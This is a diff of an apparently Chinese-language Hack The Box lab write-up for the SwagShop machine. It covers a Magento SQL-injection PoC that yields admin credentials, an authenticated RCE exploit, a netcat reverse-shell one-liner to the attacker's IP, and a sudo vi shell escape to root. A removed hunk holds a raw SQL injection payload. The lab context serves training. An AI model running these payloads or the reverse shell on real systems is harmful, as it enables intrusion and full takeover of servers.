@@ -112,14 +112,96 @@ Fixed: PayPal Standard does not display on frontend during checkout with some me
 <active>1</active>
 ```
 
-不能用上面的登录信息登录ssh
+但是我不能使用这个凭证登录ssh
 
-catalog/product_frontend_action/synchronize?
 
-type_id=recently_products&
+经过不停的谷歌搜索，找到这个cms的一个sql注入的[POC](https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py)
 
-ids[0][added_at]=&
+```
+┌──(root💀kali)-[~/htb/SwagShop]
+└─# python poc.py http://swagshop.htb                
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+WORKED
+Check http://swagshop.htb/admin with creds ypwq:123
 
-ids[0][product_id][from]=?&
+```
 
-ids[0][product_id][to]=))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -
+执行POC以后得到后台登录凭证：```ypwq:123```
+
+登录页面：```http://10.10.10.140/index.php/admin/index/```
+
+登录进系统在底部发现版本号：```Magento ver. 1.9.0.0```
+
+按照版本号找到了[这个exp](https://www.exploit-db.com/exploits/37811)
+然而这个exp一直报错，调了半天没有调好
+
+于是在github找到了[另外一个](https://github.com/epi052/htb-scripts-for-retired-boxes/blob/master/swagshop/magento-oneshot.py)替代的exp
+
+
+```
+──(root💀kali)-[~/htb/SwagShop]
+└─# python3 exp.py --username ypwq --password 123 --command "id" http://10.10.10.140/index.php/admin/index/                                                                                                                             1 ⨯
+[+] Valid credentials (ypwq:123) found. Proceeding without adding a new user.
+[-] Searching historical data using 7d as period parameter
+[-] Parsing local.xml for install date.
+[+] Found install date: Wed, 08 May 2019 07:23:09 +0000
+[-] Sending 'id' for execution on the distant end.
+[+] Exploit succeeded
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+
+
+证实存在远程代码执行
+
+用下面payload拿到反弹shell
+
+> python3 exp.py --username ypwq --password 123 --command "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4242 >/tmp/f" http://10.10.10.140/index.php/admin/index/
+
+```
+┌──(root💀kali)-[~/htb/SwagShop]
+└─# nc -lnvp 4242                          
+listening on [any] 4242 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.140] 57068
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+
+```
+
+# 提权
+查看sudo权限
+```
+www-data@swagshop:/home/haris$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+
+```
+
+可以使用vi打开/var/www/html/目录下的任何文件
+
+使用下面的命令提权到root
+
+> sudo /usr/bin/vi /var/www/html/1 -c ':!/bin/sh' /dev/null
+
+```
+"/var/www/html/1" [New File]
+# /bin/sh
+
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+whoami
+root
+
+```
+
+已经提权到root,可以读取系统里面的任何文件。
